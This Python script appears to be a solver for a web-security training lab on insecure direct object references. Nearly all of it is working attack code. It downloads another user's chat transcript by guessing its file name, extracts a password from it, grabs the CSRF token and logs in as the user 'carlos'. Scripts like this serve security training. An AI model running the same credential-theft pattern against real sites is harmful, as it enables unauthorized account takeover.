"""
    Lab: Insecure direct object references

    Exploit steps:
    1. Download the 1.txt (IDOR) 
    2. Review the text in response. Notice a password within the chat transcript.
    3. Fetch the login page to get the csrf-token
    4. Log in as 'carlos' using the stolen credentials.

    Author: N00BCYB0T
"""
import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://vulnerablehost.com)")
    parser.add_argument("--proxy", help='HTTP Proxy (e.g, http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy: 
        session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}Getting the transcription...{Fore.RESET}")
    response = fetch(session, f"/download-transcript/1.txt")

    print(f"{Fore.YELLOW}Extracting the password...{Fore.RESET}")
    password_matches = re.search(r"Ok so my password is (.+)\.", response.text)
    if not password_matches:
        print(f"{Fore.RED}[!] Password not found!{Fore.RESET}")
        exit(1)
    password = password_matches.group(1)
    print(f"{Fore.RESET}Password:{Fore.BLUE} {password}{Fore.RESET}")
    
    print(f"{Fore.YELLOW}Logging in as 'carlos'...{Fore.RESET}")
    login_page = fetch(session, '/login')
    csrf_matches = re.search(r"csrf.+value=\"(.+)\"", login_page.text)
    if not csrf_matches:
        print(f"{Fore.RED}[!] CSRF Token not found!{Fore.RESET}")
        exit(1)
    csrf = csrf_matches.group(1)
    print(f"{Fore.RESET}CSRF Token:{Fore.BLUE} {csrf}{Fore.RESET}")
    data = {
        "csrf": csrf,
        "username": "carlos",
        "password": password
    }
    login(session, data)
    print(f"{Fore.GREEN}[+] Logged in!{Fore.RESET}")
    fetch(session, '/my-account')
    print(f"{Fore.GREEN}[+] Lab was solved!{Fore.RESET}")

def login(session, data):
    try:
        session.post(f"{URL}/login", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to login as {data['username']} through exception{Fore.RESET}")
        exit(1)

def fetch(session, path):
    try:
        return session.get(f"{URL}{path}", allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to fetch {path} through exception{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()